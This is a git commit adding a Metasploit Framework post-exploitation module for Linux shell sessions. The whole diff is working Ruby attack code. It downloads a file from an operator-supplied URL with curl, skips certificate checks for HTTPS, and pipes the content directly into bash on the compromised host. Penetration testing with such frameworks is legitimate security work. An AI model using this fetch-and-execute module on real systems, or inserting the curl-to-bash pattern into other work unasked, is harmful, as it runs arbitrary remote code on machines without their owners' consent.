07d78af421a7c30ef7bc668fcb3d63c4adb22979
Joshua Abraham <jabra@spl0it.org>
2013-03-15 10:13:56 -0400

    Linux post module to download and run a command

---
+++ modules/post/linux/manage/download_exec.rb
@@ -0,0 +1,50 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
+require 'msf/core'
+require 'rex'
+require 'msf/core/post/common'
+require 'msf/core/post/file'
+require 'msf/core/post/linux/system'
+require 'msf/core/post/linux/priv'
+
+class Metasploit3 < Msf::Post
+
+	include Msf::Post::Common
+	include Msf::Post::File
+	include Msf::Post::Linux::System
+
+
+	def initialize(info={})
+		super( update_info( info,
+				'Name'          => 'Linux Download Exec',
+				'Description'   => %q{
+					This module downloads and runs a file with bash. It uses curl and bash from the PATH.
+				},
+				'License'       => MSF_LICENSE,
+				'Author'        =>
+					[
+						'Joshua D. Abraham <jabra[at]praetorian.com>',
+					],
+				'Platform'      => [ 'linux' ],
+				'SessionTypes'  => [ 'shell' ]
+			))
+			register_options(
+			[
+				OptString.new('URL', [true, 'Full URL of file to download.'])
+			], self.class)
+
+	end
+
+	def run
+		if datastore['URL'].match(/https/)
+			vcmd_exec("`which curl` -k #{datastore['URL']} 2>/dev/null | `which bash` ")
+		else
+			vcmd_exec("`which curl` #{datastore['URL']} 2>/dev/null | `which bash` ")
+		end
+	end
+end
